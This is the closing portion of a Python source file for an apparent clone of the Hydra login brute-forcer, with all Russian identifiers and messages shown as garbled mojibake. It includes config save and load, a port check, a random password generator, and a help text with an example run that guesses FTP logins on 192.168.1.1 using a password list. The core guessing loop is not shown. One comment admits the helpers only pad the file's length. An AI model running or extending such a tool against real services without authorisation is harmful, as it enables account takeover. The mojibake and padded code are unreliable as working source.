        —Ñ–∞–π–ª.write(f"–ü—Ä–æ—Ç–æ–∫–æ–ª: {–∫–æ–Ω—Ñ–∏–≥.–ø—Ä–æ—Ç–æ–∫–æ–ª}\n")
        —Ñ–∞–π–ª.write(f"–ü–æ—Ä—Ç: {–∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ä—Ç}\n")
        —Ñ–∞–π–ª.write(f"–õ–æ–≥–∏–Ω: {–∫–æ–Ω—Ñ–∏–≥.–ª–æ–≥–∏–Ω}\n")
        —Ñ–∞–π–ª.write(f"–§–∞–π–ª –ª–æ–≥–∏–Ω–æ–≤: {–∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ª–æ–≥–∏–Ω—ã}\n")
        —Ñ–∞–π–ª.write(f"–ü–∞—Ä–æ–ª—å: {–∫–æ–Ω—Ñ–∏–≥.–ø–∞—Ä–æ–ª—å}\n")
        —Ñ–∞–π–ª.write(f"–§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π: {–∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ø–∞—Ä–æ–ª–∏}\n")
        —Ñ–∞–π–ª.write(f"–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª–µ–π: {–∫–æ–Ω—Ñ–∏–≥.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π}\n")
        —Ñ–∞–π–ª.write(f"–ü–æ—Ç–æ–∫–∏: {–∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ç–µ–∫–∏}\n")
        —Ñ–∞–π–ª.write(f"SSL: {–∫–æ–Ω—Ñ–∏–≥.ssl}\n")
        —Ñ–∞–π–ª.write(f"–í—ã—Ö–æ–¥ –ø—Ä–∏ —É—Å–ø–µ—Ö–µ: {–∫–æ–Ω—Ñ–∏–≥.–≤—ã—Ö–æ–¥_–ø—Ä–∏_—É—Å–ø–µ—Ö–µ}\n")
        —Ñ–∞–π–ª.write(f"–§–∞–π–ª –≤—ã–≤–æ–¥–∞: {–∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞}\n")
        —Ñ–∞–π–ª.write(f"–ü–æ–¥—Ä–æ–±–Ω—ã–π —Ä–µ–∂–∏–º: {–∫–æ–Ω—Ñ–∏–≥.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º}\n")

def –∑–∞–≥—Ä—É–∑–∏—Ç—å_–∫–æ–Ω—Ñ–∏–≥(–ø—É—Ç—å: str) -> –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:
    """–ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∏–∑ —Ñ–∞–π–ª–∞."""
    –∫–æ–Ω—Ñ–∏–≥ = –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è()
    with open(–ø—É—Ç—å, 'r', encoding='utf-8') as —Ñ–∞–π–ª:
        for –ª–∏–Ω–∏—è in —Ñ–∞–π–ª:
            –∫–ª—é—á, –∑–Ω–∞—á–µ–Ω–∏–µ = –ª–∏–Ω–∏—è.strip().split(': ', 1)
            if –∫–ª—é—á == '–¶–µ–ª—å':
                –∫–æ–Ω—Ñ–∏–≥.—Ü–µ–ª—å = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–ü—Ä–æ—Ç–æ–∫–æ–ª':
                –∫–æ–Ω—Ñ–∏–≥.–ø—Ä–æ—Ç–æ–∫–æ–ª = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–ü–æ—Ä—Ç':
                –∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ä—Ç = int(–∑–Ω–∞—á–µ–Ω–∏–µ)
            elif –∫–ª—é—á == '–õ–æ–≥–∏–Ω':
                –∫–æ–Ω—Ñ–∏–≥.–ª–æ–≥–∏–Ω = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–§–∞–π–ª –ª–æ–≥–∏–Ω–æ–≤':
                –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ª–æ–≥–∏–Ω—ã = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–ü–∞—Ä–æ–ª—å':
                –∫–æ–Ω—Ñ–∏–≥.–ø–∞—Ä–æ–ª—å = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π':
                –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ø–∞—Ä–æ–ª–∏ = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª–µ–π':
                –∫–æ–Ω—Ñ–∏–≥.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–ü–æ—Ç–æ–∫–∏':
                –∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ç–µ–∫–∏ = int(–∑–Ω–∞—á–µ–Ω–∏–µ)
            elif –∫–ª—é—á == 'SSL':
                –∫–æ–Ω—Ñ–∏–≥.ssl = –∑–Ω–∞—á–µ–Ω–∏–µ.lower() == 'true'
            elif –∫–ª—é—á == '–í—ã—Ö–æ–¥ –ø—Ä–∏ —É—Å–ø–µ—Ö–µ':
                –∫–æ–Ω—Ñ–∏–≥.–≤—ã—Ö–æ–¥_–ø—Ä–∏_—É—Å–ø–µ—Ö–µ = –∑–Ω–∞—á–µ–Ω–∏–µ.lower() == 'true'
            elif –∫–ª—é—á == '–§–∞–π–ª –≤—ã–≤–æ–¥–∞':
                –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞ = –∑–Ω–∞—á–µ–Ω–∏–µ
            elif –∫–ª—é—á == '–ü–æ–¥—Ä–æ–±–Ω—ã–π —Ä–µ–∂–∏–º':
                –∫–æ–Ω—Ñ–∏–≥.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º = –∑–Ω–∞—á–µ–Ω–∏–µ.lower() == 'true'
    return –∫–æ–Ω—Ñ–∏–≥

# –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Ç–∏–ª–∏—Ç—ã –¥–ª—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è –æ–±—ä—ë–º–∞
def –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_–ø–æ—Ä—Ç(—Ü–µ–ª—å: str, –ø–æ—Ä—Ç: int) -> bool:
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ –ø–æ—Ä—Ç–∞."""
    —Å–æ–∫–µ—Ç = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    —Å–æ–∫–µ—Ç.settimeout(2)
    —Ä–µ–∑—É–ª—å—Ç–∞—Ç = —Å–æ–∫–µ—Ç.connect_ex((—Ü–µ–ª—å, –ø–æ—Ä—Ç))
    —Å–æ–∫–µ—Ç.close()
    return —Ä–µ–∑—É–ª—å—Ç–∞—Ç == 0

def –ø–æ–ª—É—á–∏—Ç—å_—Å–ø–∏—Å–æ–∫_–ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤() -> List[str]:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã—Ö –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤."""
    return ['http', 'ftp', 'ssh']

def –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å_–ø—Ä–æ—Ç–æ–∫–æ–ª(–ø—Ä–æ—Ç–æ–∫–æ–ª: str) -> bool:
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞."""
    return –ø—Ä–æ—Ç–æ–∫–æ–ª.lower() in –ø–æ–ª—É—á–∏—Ç—å_—Å–ø–∏—Å–æ–∫_–ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤()

def —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å_—Å–ª—É—á–∞–π–Ω—ã–π_–ø–∞—Ä–æ–ª—å(–¥–ª–∏–Ω–∞: int) -> str:
    """–ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è."""
    —Å–∏–º–≤–æ–ª—ã = string.ascii_letters + string.digits
    return ''.join(random.choice(—Å–∏–º–≤–æ–ª—ã) for _ in range(–¥–ª–∏–Ω–∞))

def –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å_–æ—à–∏–±–∫—É(–æ—à–∏–±–∫–∞: Exception, –∫–æ–Ω—Ç–µ–∫—Å—Ç: str):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—à–∏–±–æ–∫."""
    logger.error(f"–û—à–∏–±–∫–∞ –≤ {–∫–æ–Ω—Ç–µ–∫—Å—Ç}: {str(–æ—à–∏–±–∫–∞)}")

def –≤—ã–≤–µ—Å—Ç–∏_—Å–ø—Ä–∞–≤–∫—É():
    """–í—ã–≤–æ–¥ —Å–ø—Ä–∞–≤–∫–∏ –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é."""
    print("–ö–ª–æ–Ω Hydra ‚Äî —É—Ç–∏–ª–∏—Ç–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø–∞—Ä–æ–ª–µ–π.")
    print("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: python hydra_clone.py [–æ–ø—Ü–∏–∏] —Ü–µ–ª—å –ø—Ä–æ—Ç–æ–∫–æ–ª")
    print("–û–ø—Ü–∏–∏:")
    print("  -l –õ–û–ì–ò–ù          –£–∫–∞–∑–∞—Ç—å –µ–¥–∏–Ω–∏—á–Ω—ã–π –ª–æ–≥–∏–Ω")
    print("  -L –§–ê–ô–õ          –§–∞–π–ª —Å–æ —Å–ø–∏—Å–∫–æ–º –ª–æ–≥–∏–Ω–æ–≤")
    print("  -p –ü–ê–†–û–õ–¨        –£–∫–∞–∑–∞—Ç—å –µ–¥–∏–Ω–∏—á–Ω—ã–π –ø–∞—Ä–æ–ª—å")
    print("  -P –§–ê–ô–õ          –§–∞–π–ª —Å–æ —Å–ø–∏—Å–∫–æ–º –ø–∞—Ä–æ–ª–µ–π")
    print("  -x –ú–ò–ù:–ú–ê–ö–°:–°–ò–ú–í–û–õ–´  –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª–µ–π")
    print("  -s –ü–û–†–¢          –£–∫–∞–∑–∞—Ç—å –ø–æ—Ä—Ç")
    print("  -S               –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å SSL")
    print("  -t –ü–û–¢–û–ö–ò        –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã—Ö –ø–æ—Ç–æ–∫–æ–≤")
    print("  -f               –í—ã—Ö–æ–¥ –ø–æ—Å–ª–µ —É—Å–ø–µ—Ö–∞")
    print("  -o –§–ê–ô–õ          –§–∞–π–ª –¥–ª—è –∑–∞–ø–∏—Å–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤")
    print("  -v               –ü–æ–¥—Ä–æ–±–Ω—ã–π —Ä–µ–∂–∏–º –≤—ã–≤–æ–¥–∞")
    print("–ü—Ä–∏–º–µ—Ä: python hydra_clone.py -l admin -P –ø–∞—Ä–æ–ª–∏.txt 192.168.1.1 ftp")

# –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã
if __name__ == "__main__":
    try:
        –≥–ª–∞–≤–Ω—ã–π()
    except KeyboardInterrupt:
        logger.info("–ü—Ä–æ–≥—Ä–∞–º–º–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        print("–ü—Ä–µ—Ä–≤–∞–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å_–æ—à–∏–±–∫—É(e, "–≥–ª–∞–≤–Ω—ã–π —Ü–∏–∫–ª")
        sys.exit(1)